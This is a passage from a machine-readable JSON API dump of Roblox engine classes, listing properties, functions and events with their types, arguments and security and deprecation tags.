Class":"CylindricalConstraint"},{"Superclass":"SlidingBallConstraint","type":"Class","Name":"PrismaticConstraint","tags":[]},{"Superclass":"Constraint","type":"Class","Name":"SpringConstraint","tags":[]},{"ValueType":"float","type":"Property","Name":"Coils","tags":[],"Class":"SpringConstraint"},{"ValueType":"float","type":"Property","Name":"CurrentLength","tags":["readonly"],"Class":"SpringConstraint"},{"ValueType":"float","type":"Property","Name":"Damping","tags":[],"Class":"SpringConstraint"},{"ValueType":"float","type":"Property","Name":"FreeLength","tags":[],"Class":"SpringConstraint"},{"ValueType":"bool","type":"Property","Name":"LimitsEnabled","tags":[],"Class":"SpringConstraint"},{"ValueType":"float","type":"Property","Name":"MaxForce","tags":[],"Class":"SpringConstraint"},{"ValueType":"float","type":"Property","Name":"MaxLength","tags":[],"Class":"SpringConstraint"},{"ValueType":"float","type":"Property","Name":"MinLength","tags":[],"Class":"SpringConstraint"},{"ValueType":"float","type":"Property","Name":"Radius","tags":[],"Class":"SpringConstraint"},{"ValueType":"float","type":"Property","Name":"Stiffness","tags":[],"Class":"SpringConstraint"},{"ValueType":"float","type":"Property","Name":"Thickness","tags":[],"Class":"SpringConstraint"},{"Superclass":"Constraint","type":"Class","Name":"Torque","tags":[]},{"ValueType":"ActuatorRelativeTo","type":"Property","Name":"RelativeTo","tags":[],"Class":"Torque"},{"ValueType":"Vector3","type":"Property","Name":"Torque","tags":[],"Class":"Torque"},{"Superclass":"Constraint","type":"Class","Name":"VectorForce","tags":[]},{"ValueType":"bool","type":"Property","Name":"ApplyAtCenterOfMass","tags":[],"Class":"VectorForce"},{"ValueType":"Vector3","type":"Property","Name":"Force","tags":[],"Class":"VectorForce"},{"ValueType":"ActuatorRelativeTo","type":"Property","Name":"RelativeTo","tags":[],"Class":"VectorForce"},{"Superclass":"Instance","type":"Class","Name":"ContentProvider","tags":[]},{"ValueType":"string","type":"Property","Name":"BaseUrl","tags":["readonly"],"Class":"ContentProvider"},{"ValueType":"int","type":"Property","Name":"RequestQueueSize","tags":["readonly"],"Class":"ContentProvider"},{"ReturnType":"void","Arguments":[{"Type":"Content","Name":"contentId","Default":null}],"Name":"Preload","tags":["deprecated"],"Class":"ContentProvider","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetBaseUrl","tags":["LocalUserSecurity"],"Class":"ContentProvider","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Array","Name":"contentIdList","Default":null}],"Name":"PreloadAsync","tags":[],"Class":"ContentProvider","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"ContextActionService","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"Function","Name":"functionToBind","Default":null},{"Type":"bool","Name":"createTouchButton","Default":null},{"Type":"Tuple","Name":"inputTypes","Default":null}],"Name":"BindAction","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"Function","Name":"functionToBind","Default":null},{"Type":"bool","Name":"createTouchButton","Default":null},{"Type":"int","Name":"priorityLevel","Default":null},{"Type":"Tuple","Name":"inputTypes","Default":null}],"Name":"BindActionAtPriority","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"Function","Name":"functionToBind","Default":null},{"Type":"bool","Name":"createTouchButton","Default":null},{"Type":"Tuple","Name":"inputTypes","Default":null}],"Name":"BindActionToInputTypes","tags":["deprecated"],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"UserInputType","Name":"userInputTypeForActivation","Default":null},{"Type":"KeyCode","Name":"keyCodeForActivation","Default":"Unknown"}],"Name":"BindActivate","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"Function","Name":"functionToBind","Default":null},{"Type":"bool","Name":"createTouchButton","Default":null},{"Type":"Tuple","Name":"inputTypes","Default":null}],"Name":"BindCoreAction","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"Function","Name":"functionToBind","Default":null},{"Type":"bool","Name":"createTouchButton","Default":null},{"Type":"int","Name":"priorityLevel","Default":null},{"Type":"Tuple","Name":"inputTypes","Default":null}],"Name":"BindCoreActionAtPriority","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"UserInputState","Name":"state","Default":null},{"Type":"Instance","Name":"inputObject","Default":null}],"Name":"CallFunction","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"Instance","Name":"actionButton","Default":null}],"Name":"FireActionButtonFoundSignal","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Function"},{"ReturnType":"Dictionary","Arguments":[],"Name":"GetAllBoundActionInfo","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"Dictionary","Arguments":[],"Name":"GetAllBoundCoreActionInfo","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Function"},{"ReturnType":"Dictionary","Arguments":[{"Type":"string","Name":"actionName","Default":null}],"Name":"GetBoundActionInfo","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"Dictionary","Arguments":[{"Type":"string","Name":"actionName","Default":null}],"Name":"GetBoundCoreActionInfo","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"GetCurrentLocalToolIcon","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"string","Name":"description","Default":null}],"Name":"SetDescription","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"string","Name":"image","Default":null}],"Name":"SetImage","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"UDim2","Name":"position","Default":null}],"Name":"SetPosition","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"string","Name":"title","Default":null}],"Name":"SetTitle","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null}],"Name":"UnbindAction","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"UserInputType","Name":"userInputTypeForActivation","Default":null},{"Type":"KeyCode","Name":"keyCodeForActivation","Default":"Unknown"}],"Name":"UnbindActivate","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"UnbindAllActions","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null}],"Name":"UnbindCoreAction","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"actionName","Default":null}],"Name":"GetButton","tags":[],"Class":"ContextActionService","type":"YieldFunction"},{"Arguments":[{"Name":"actionAdded","Type":"string"},{"Name":"createTouchButton","Type":"bool"},{"Name":"functionInfoTable","Type":"Dictionary"},{"Name":"isCore","Type":"bool"}],"Name":"BoundActionAdded","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Event"},{"Arguments":[{"Name":"actionChanged","Type":"string"},{"Name":"changeName","Type":"string"},{"Name":"changeTable","Type":"Dictionary"}],"Name":"BoundActionChanged","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Event"},{"Arguments":[{"Name":"actionRemoved","Type":"string"},{"Name":"functionInfoTable","Type":"Dictionary"},{"Name":"isCore","Type":"bool"}],"Name":"BoundActionRemoved","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Event"},{"Arguments":[{"Name":"actionName","Type":"string"}],"Name":"GetActionButtonEvent","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Event"},{"Arguments":[{"Name":"toolEquipped","Type":"Instance"}],"Name":"LocalToolEquipped","tags":[],"Class":"ContextActionService","type":"Event"},{"Arguments":[{"Name":"toolUnequipped","Type":"Instance"}],"Name":"LocalToolUnequipped","tags":[],"Class":"ContextActionService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Controller","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"Button","Name":"button","Default":null},{"Type":"string","Name":"caption","Default":null}],"Name":"BindButton","tags":[],"Class":"Controller","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Button","Name":"button","Default":null}],"Name":"GetButton","tags":[],"Class":"Controller","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Button","Name":"button","Default":null}],"Name":"UnbindButton","tags":[],"Class":"Controller","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Button","Name":"button","Default":null},{"Type":"string","Name":"caption","Default":null}],"Name":"bindButton","tags":["deprecated"],"Class":"Controller","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Button","Name":"button","Default":null}],"Name":"getButton","tags":["deprecated"],"Class":"Controller","type":"Function"},{"Arguments":[{"Name":"button","Type":"Button"}],"Name":"ButtonChanged","tags":[],"Class":"Controller","type":"Event"},{"Superclass":"Controller","type":"Class","Name":"HumanoidController","tags":[]},{"Superclass":"Controller","type":"Class","Name":"SkateboardController","tags":[]},{"ValueType":"float","type":"Property","Name":"Steer","tags":["readonly"],"Class":"SkateboardController"},{"ValueType":"float","type":"Property","Name":"Throttle","tags":["readonly"],"Class":"SkateboardController"},{"Arguments":[{"Name":"axis","Type":"string"}],"Name":"AxisChanged","tags":[],"Class":"SkateboardController","type":"Event"},{"Superclass":"Controller","type":"Class","Name":"VehicleController","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ControllerService","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"CookiesService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"CustomEvent","tags":["deprecated"]},{"ReturnType":"Objects","Arguments":[],"Name":"GetAttachedReceivers","tags":[],"Class":"CustomEvent","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"newValue","Default":null}],"Name":"SetValue","tags":[],"Class":"CustomEvent","type":"Function"},{"Arguments":[{"Name":"receiver","Type":"Instance"}],"Name":"ReceiverConnected","tags":[],"Class":"CustomEvent","type":"Event"},{"Arguments":[{"Name":"receiver","Type":"Instance"}],"Name":"ReceiverDisconnected","tags":[],"Class":"CustomEvent","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"CustomEventReceiver","tags":["deprecated"]},{"ValueType":"Object","type":"Property","Name":"Source","tags":[],"Class":"CustomEventReceiver"},{"ReturnType":"float","Arguments":[],"Name":"GetCurrentValue","tags":[],"Class":"CustomEventReceiver","type":"Function"},{"Arguments":[{"Name":"event","Type":"Instance"}],"Name":"EventConnected","tags":[],"Class":"CustomEventReceiver","type":"Event"},{"Arguments":[{"Name":"event","Type":"Instance"}],"Name":"EventDisconnected","tags":[],"Class":"CustomEventReceiver","type":"Event"},{"Arguments":[{"Name":"newValue","Type":"float"}],"Name":"SourceValueChanged","tags":[],"Class":"CustomEventReceiver","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"DataModelMesh","tags":["notbrowsable"]},{"ValueType":"Vector3","type":"Property","Name":"Offset","tags":[],"Class":"DataModelMesh"},{"ValueType":"Vector3","type":"Property","Name":"Scale","tags":[],"Class":"DataModelMesh"},{"ValueType":"Vector3","type":"Property","Name":"VertexColor","tags":[],"Class":"DataModelMesh"},{"Superclass":"DataModelMesh","type":"Class","Name":"BevelMesh","tags":["deprecated","notbrowsable"]},{"Superclass":"BevelMesh","type":"Class","Name":"BlockMesh","tags":[]},{"Superclass":"BevelMesh","type":"Class","Name":"CylinderMesh","tags":[]},{"Superclass":"DataModelMesh","type":"Class","Name":"FileMesh","tags":[]},{"ValueType":"Content","type":"Property","Name":"MeshId","tags":[],"Class":"FileMesh"},{"ValueType":"Content","type":"Property","Name":"TextureId","tags":[],"Class":"FileMesh"},{"Superclass":"FileMesh","type":"Class","Name":"SpecialMesh","tags":[]},{"ValueType":"MeshType","type":"Property","Name":"MeshType","tags":[],"Class":"SpecialMesh"},{"Superclass":"Instance","type":"Class","Name":"DataStoreService","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"AutomaticRetry","tags":["LocalUserSecurity"],"Class":"DataStoreService"},{"ValueType":"bool","type":"Property","Name":"LegacyNamingScheme","tags":["LocalUserSecurity","deprecated"],"Class":"DataStoreService"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"string","Name":"scope","Default":"global"}],"Name":"GetDataStore","tags":[],"Class":"DataStoreService","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetGlobalDataStore","tags":[],"Class":"DataStoreService","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"string","Name":"scope","Default":"global"}],"Name":"GetOrderedDataStore","tags":[],"Class":"DataStoreService","type":"Function"},{"ReturnType":"int","Arguments":[{"Type":"DataStoreRequestType","Name":"requestType","Default":null}],"Name":"GetRequestBudgetForRequestType","tags":[],"Class":"DataStoreService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Debris","tags":[]},{"ValueType":"int","type":"Property","Name":"MaxItems","tags":["deprecated"],"Class":"Debris"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"item","Default":null},{"Type":"double","Name":"lifetime","Default":"10"}],"Name":"AddItem","tags":[],"Class":"Debris","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"enabled","Default":null}],"Name":"SetLegacyMaxItems","tags":["LocalUserSecurity"],"Class":"Debris","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"item","Default":null},{"Type":"double","Name":"lifetime","Default":"10"}],"Name":"addItem","tags":["deprecated"],"Class":"Debris","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"DebugSettings","tags":["notbrowsable"]},{"ValueType":"int","type":"Property","Name":"DataModel","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"ErrorReporting","type":"Property","Name":"ErrorReporting","tags":[],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"GfxCard","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"InstanceCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"bool","type":"Property","Name":"IsFmodProfilingEnabled","tags":[],"Class":"DebugSettings"},{"ValueType":"bool","type":"Property","Name":"IsScriptStackTracingEnabled","tags":[],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"JobCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"LuaRamLimit","tags":[],"Class":"DebugSettings"},{"ValueType":"bool","type":"Property","Name":"OsIs64Bit","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"OsPlatform","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"OsPlatformId","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"OsVer","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"PlayerCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"bool","type":"Property","Name":"ReportSoundWarnings","tags":[],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"RobloxProductName","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"RobloxVersion","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"SIMD","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"SystemProductName","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"TickCountSampleMethod","type":"Property","Name":"TickCountPreciseOverride","tags":[],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"VideoMemory","tags":["readonly"],"Class":"DebugSettings"},{"Superclass":"Instance","type":"Class","Name":"DebuggerBreakpoint","tags":["notCreatable"]},{"ValueType":"string","type":"Property","Name":"Condition","tags":[],"Class":"DebuggerBreakpoint"},{"ValueType":"bool","type":"Property","Name":"IsEnabled","tags":[],"Class":"DebuggerBreakpoint"},{"ValueType":"int","type":"Property","Name":"Line","tags":["readonly"],"Class":"DebuggerBreakpoint"},{"Superclass":"Instance","type":"Class","Name":"DebuggerManager","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"DebuggingEnabled","tags":["readonly"],"Class":"DebuggerManager"},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"script","Default":null}],"Name":"AddDebugger","tags":[],"Class":"DebuggerManager","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"EnableDebugging","tags":["LocalUserSecurity"],"Class":"DebuggerManager","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetDebuggers","tags":[],"Class":"DebuggerManager","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Resume","tags":[],"Class":"DebuggerManager","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"StepIn","tags":[],"Class":"DebuggerManager","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"StepOut","tags":[],"Class":"DebuggerManager","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"StepOver","tags":[],"Class":"DebuggerManager","type":"Function"},{"Arguments":[{"Name":"debugger","Type":"Instance"}],"Name":"DebuggerAdded","tags":[],"Class":"DebuggerManager","type":"Event"},{"Arguments":[{"Name":"debugger","Type":"Instance"}],"Name":"DebuggerRemoved","tags":[],"Class":"DebuggerManager","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"DebuggerWatch","tags":[]},{"ValueType":"string","type":"Property","Name":"Expression","tags":[],"Class":"DebuggerWatch"},{"ReturnType":"void","Arguments":[],"Name":"CheckSyntax","tags":[],"Class":"DebuggerWatch","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Dialog","tags":[]},{"ValueType":"DialogBehaviorType","type":"Property","Name":"BehaviorType","tags":[],"Class":"Dialog"},{"ValueType":"float","type":"Property","Name":"ConversationDistance","tags":[],"Class":"Dialog"},{"ValueType":"bool","type":"Property","Name":"GoodbyeChoiceActive","tags":[],"Class":"Dialog"},{"ValueType":"string","type":"Property","Name":"GoodbyeDialog","tags":[],"Class":"Dialog"},{"ValueType":"bool","type":"Property","Name":"InUse","tags":[],"Class":"Dialog"},{"ValueType":"string","type":"Property","Name":"InitialPrompt","tags":[],"Class":"Dialog"},{"ValueType":"DialogPurpose","type":"Property","Name":"Purpose","tags":[],"Class":"Dialog"},{"ValueType":"DialogTone","type":"Property","Name":"Tone","tags":[],"Class":"Dialog"},{"ValueType":"float","type":"Property","Name":"TriggerDistance","tags":[],"Class":"Dialog"},{"ValueType":"Vector3","type":"Property","Name":"TriggerOffset","tags":[],"Class":"Dialog"},{"ReturnType":"Objects","Arguments":[],"Name":"GetCurrentPlayers","tags":[],"Class":"Dialog","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"bool","Name":"isUsing","Default":null}],"Name":"SetPlayerIsUsing","tags":["RobloxScriptSecurity"],"Class":"Dialog","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"Instance","Name":"dialogChoice","Default":null}],"Name":"SignalDialogChoiceSelected","tags":["RobloxScriptSecurity"],"Class":"Dialog","type":"Function"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"dialogChoice","Type":"Instance"}],"Name":"DialogChoiceSelected","tags":[],"Class":"Dialog","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"DialogChoice","tags":[]},{"ValueType":"bool","type":"Property","Name":"GoodbyeChoiceActive","tags":[],"Class":"DialogChoice"},{"ValueType":"string","type":"Property","Name":"GoodbyeDialog","tags":[],"Class":"DialogChoice"},{"ValueType":"string","type":"Property","Name":"ResponseDialog","tags":[],"Class":"DialogChoice"},{"ValueType":"string","type":"Property","Name":"UserDialog","tags":[],"Class":"DialogChoice"},{"Superclass":"Instance","type":"Class","Name":"DoubleConstrainedValue","tags":["deprecated"]},{"ValueType":"double","type":"Property","Name":"ConstrainedValue","tags":["hidden"],"Class":"DoubleConstrainedValue"},{"ValueType":"double","type":"Property","Name":"MaxValue","tags":[],"Class":"DoubleConstrainedValue"},{"ValueType":"double","type":"Property","Name":"MinValue","tags":[],"Class":"DoubleConstrainedValue"},{"ValueType":"double","type":"Property","Name":"Value","tags":[],"Class":"DoubleConstrainedValue"},{"Arguments":[{"Name":"value","Type":"double"}],"Name":"Changed","tags":[],"Class":"DoubleConstrainedValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"double"}],"Name":"changed","tags":["deprecated"],"Class":"DoubleConstrainedValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Dragger","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"Axis","Name":"axis","Default":"X"}],"Name":"AxisRotate","tags":[],"Class":"Dragger","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"mousePart","Default":null},{"Type":"Vector3","Name":"pointOnMousePart","Default":null},{"Type":"Objects","Name":"parts","Default":null}],"Name":"MouseDown","tags":[],"Class":"Dragger","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Ray","Name":"mouseRay","Default":null}],"Name":"MouseMove","tags":[],"Class":"Dragger","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"MouseUp","tags":[],"Class":"Dragger","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Explosion","tags":[]},{"ValueType":"float","type":"Property","Name":"BlastPressure","tags":[],"Class":"Explosion"},{"ValueType":"float","type":"Property","Name":"BlastRadius","tags":[],"Class":"Explosion"},{"ValueType":"float","type":"Property","Name":"DestroyJointRadiusPercent","tags":[],"Class":"Explosion"},{"ValueType":"ExplosionType","type":"Property","Name":"ExplosionType","tags":[],"Class":"Explosion"},{"ValueType":"Vector3","type":"Property","Name":"Position","tags":[],"Class":"Explosion"},{"ValueType":"bool","type":"Property","Name":"Visible","tags":[],"Class":"Explosion"},{"Arguments":[{"Name":"part","Type":"Instance"},{"Name":"distance","Type":"float"}],"Name":"Hit","tags":[],"Class":"Explosion","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"FaceInstance","tags":["notbrowsable"]},{"ValueType":"NormalId","type":"Property","Name":"Face","tags":[],"Class":"FaceInstance"},{"Superclass":"FaceInstance","type":"Class","Name":"Decal","tags":[]},{"ValueType":"Color3","type":"Property","Name":"Color3","tags":[],"Class":"Decal"},{"ValueType":"float","type":"Property","Name":"LocalTransparencyModifier","tags":["hidden"],"Class":"Decal"},{"ValueType":"float","type":"Property","Name":"Shiny","tags":["deprecated"],"Class":"Decal"},{"ValueType":"float","type":"Property","Name":"Specular","tags":["deprecated"],"Class":"Decal"},{"ValueType":"Content","type":"Property","Name":"Texture","tags":[],"Class":"Decal"},{"ValueType":"float","type":"Property","Name":"Transparency","tags":[],"Class":"Decal"},{"Superclass":"Decal","type":"Class","Name":"Texture","tags":[]},{"ValueType":"float","type":"Property","Name":"StudsPerTileU","tags":[],"Class":"Texture"},{"ValueType":"float","type":"Property","Name":"StudsPerTileV","tags":[],"Class":"Texture"},{"Superclass":"Instance","type":"Class","Name":"Feature","tags":[]},{"ValueType":"NormalId","type":"Property","Name":"FaceId","tags":[],"Class":"Feature"},{"ValueType":"InOut","type":"Property","Name":"InOut","tags":[],"Class":"Feature"},{"ValueType":"LeftRight","type":"Property","Name":"LeftRight","tags":[],"Class":"Feature"},{"ValueType":"TopBottom","type":"Property","Name":"TopBottom","tags":[],"Class":"Feature"},{"Superclass":"Feature","type":"Class","Name":"Hole","tags":["deprecated"]},{"Superclass":"Feature","type":"Class","Name":"MotorFeature","tags":["deprecated"]},{"Superclass":"Instance","type":"Class","Name":"Fire","tags":[]},{"ValueType":"Color3","type":"Property","Name":"Color","tags":[],"Class":"Fire"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"Fire"},{"ValueType":"float","type":"Property","Name":"Heat","tags":[],"Class":"Fire"},{"ValueType":"Color3","type":"Property","Name":"SecondaryColor","tags":[],"Class":"Fire"},{"ValueType":"float","type":"Property","Name":"Size","tags":[],"Class":"Fire"},{"ValueType":"float","type":"Property","Name":"size","tags":["deprecated"],"Class":"Fire"},{"Superclass":"Instance","type":"Class","Name":"FlagStandService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"FlyweightService","tags":[]},{"Superclass":"FlyweightService","type":"Class","Name":"CSGDictionaryService","tags":[]},{"Superclass":"FlyweightService","type":"Class","Name":"NonReplicatedCSGDictionaryService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Folder","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ForceField","tags":[]},{"ValueType":"bool","type":"Property","Name":"Visible","tags":[],"Class":"ForceField"},{"Superclass":"Instance","type":"Class","Name":"FriendService","tags":["notCreatable"]},{"ReturnType":"Array","Arguments":[],"Name":"GetPlatformFriends","tags":["RobloxScriptSecurity"],"Class":"FriendService","type":"YieldFunction"},{"Arguments":[{"Name":"friendData","Type":"Array"}],"Name":"FriendsUpdated","tags":["RobloxScriptSecurity"],"Class":"FriendService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"FunctionalTest","tags":["deprecated"]},{"ValueType":"string","type":"Property","Name":"Description","tags":[],"Class":"FunctionalTest"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":""}],"Name":"Error","tags":[],"Class":"FunctionalTest","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":""}],"Name":"Failed","tags":[],"Class":"FunctionalTest","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":""}],"Name":"Pass","tags":[],"Class":"FunctionalTest","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":""}],"Name":"Passed","tags":[],"Class":"FunctionalTest","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":""}],"Name":"Warn","tags":[],"Class":"FunctionalTest","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"GamePassService","tags":[]},{"ReturnType":"bool","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"int","Name":"gamePassId","Default":null}],"Name":"PlayerHasPass","tags":[],"Class":"GamePassService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"GameSettings","tags":["notbrowsable"]},{"ValueType":"string","type":"Property","Name":"AdditionalCoreIncludeDirs","tags":[],"Class":"GameSettings"},{"ValueType":"float","type":"Property","Name":"BubbleChatLifetime","tags":[],"Class":"GameSettings"},{"ValueType":"int","type":"Property","Name":"BubbleChatMaxBubbles","tags":[],"Class":"GameSettings"},{"ValueType":"int","type":"Property","Name":"ChatHistory","tags":[],"Class":"GameSettings"},{"ValueType":"int","type":"Property","Name":"ChatScrollLength","tags":[],"Class":"GameSettings"},{"ValueType":"bool","type":"Property","Name":"CollisionSoundEnabled","tags":["deprecated"],"Class":"GameSettings"},{"ValueType":"float","type":"Property","Name":"CollisionSoundVolume","tags":["deprecated"],"Class":"GameSettings"},{"ValueType":"bool","type":"Property","Name":"HardwareMouse","tags":[],"Class":"GameSettings"},{"ValueType":"int","type":"Property","Name":"MaxCollisionSounds","tags":["deprecated"],"Class":"GameSettings"},{"ValueType":"string","type":"Property","Name":"OverrideStarterScript","tags":[],"Class":"GameSettings"},{"ValueType":"int","type":"Property","Name":"ReportAbuseChatHistory","tags":[],"Class":"GameSettings"},{"ValueType":"bool","type":"Property","Name":"SoftwareSound","tags":[],"Class":"GameSettings"},{"ValueType":"bool","type":"Property","Name":"VideoCaptureEnabled","tags":[],"Class":"GameSettings"},{"ValueType":"VideoQualitySettings","type":"Property","Name":"VideoQuality","tags":[],"Class":"GameSettings"},{"Arguments":[{"Name":"recording","Type":"bool"}],"Name":"VideoRecordingChangeRequest","tags":["RobloxScriptSecurity"],"Class":"GameSettings","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"GamepadService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Geometry","tags":[]},{"Superclass":"Instance","type":"Class","Name":"GlobalDataStore","tags":[]},{"ReturnType":"Connection","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"Function","Name":"callback","Default":null}],"Name":"OnUpdate","tags":[],"Class":"GlobalDataStore","type":"Function"},{"ReturnType":"Variant","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"GetAsync","tags":[],"Class":"GlobalDataStore","type":"YieldFunction"},{"ReturnType":"Variant","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"int","Name":"delta","Default":"1"}],"Name":"IncrementAsync","tags":[],"Class":"GlobalDataStore","type":"YieldFunction"},{"ReturnType":"Variant","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"RemoveAsync","tags":[],"Class":"GlobalDataStore","type":"YieldFunction"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"Variant","Name":"value","Default":null}],"Name":"SetAsync","tags":[],"Class":"GlobalDataStore","type":"YieldFunction"},{"ReturnType":"Tuple","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"Function","Name":"transformFunction","Default":null}],"Name":"UpdateAsync","tags":[],"Class":"GlobalDataStore","type":"YieldFunction"},{"Superclass":"GlobalDataStore","type":"Class","Name":"